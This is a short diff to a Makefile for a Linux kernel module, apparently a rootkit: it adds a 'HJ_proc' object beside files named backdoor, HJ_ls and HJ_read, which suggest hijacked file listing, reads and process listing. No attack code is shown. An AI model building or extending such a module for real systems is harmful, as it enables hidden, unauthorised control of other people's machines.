@@ -9,7 +9,7 @@
 ############################################################
 
 obj-m += kcr.o  
-kcr-objs	:=	./src/kcr.o ./src/helpers.o ./src/HJ_ls.o ./src/dev.o ./src/backdoor.o ./src/HJ_read.o
+kcr-objs	:=	./src/kcr.o ./src/helpers.o ./src/HJ_ls.o ./src/dev.o ./src/backdoor.o ./src/HJ_read.o ./src/HJ_proc.o
 
 MAKE	:= make 
 KERNEL	:= /lib/modules/$(shell uname -r)/build
